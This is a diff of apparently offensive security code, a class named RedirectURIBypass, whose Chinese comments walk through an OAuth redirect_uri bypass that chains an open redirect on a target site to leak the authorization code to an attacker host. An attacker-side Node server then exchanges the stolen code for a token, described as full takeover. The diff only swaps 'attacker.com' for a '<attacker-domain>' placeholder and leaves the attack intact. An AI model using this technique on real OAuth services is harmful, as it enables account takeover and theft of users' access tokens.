@@ -303,12 +303,12 @@ class RedirectURIBypass:
 <!-- 验证通过后?code=xxx 被追加到 redirect_uri 尾部 -->
 
 <!-- 攻击构造: -->
-<!-- redirect_uri=https://target.com/redirect?to=https://attacker.com/ -->
+<!-- redirect_uri=https://target.com/redirect?to=https://<attacker-domain>/ -->
 <!-- 认证后浏览器跳转到: -->
-<!-- https://target.com/redirect?to=https://attacker.com/?code=AUTH_CODE -->
+<!-- https://target.com/redirect?to=https://<attacker-domain>/?code=AUTH_CODE -->
 
 <!-- target.com/redirect 服务执行 302 → -->
-<!-- Location: https://attacker.com/?code=AUTH_CODE -->
+<!-- Location: https://<attacker-domain>/?code=AUTH_CODE -->
 
 <!-- 攻击者服务器记录 code → 交换 token → 完全接管 -->
 <script>
@@ -328,7 +328,7 @@ http.createServer((req, res) => {
                 code: query.code,
                 client_id: 'ATTACKER_CLIENT_ID',
                 client_secret: 'ATTACKER_CLIENT_SECRET',
-                redirect_uri: 'https://attacker.com/callback',
+                redirect_uri: 'https://<attacker-domain>/callback',
             })
         });
     }
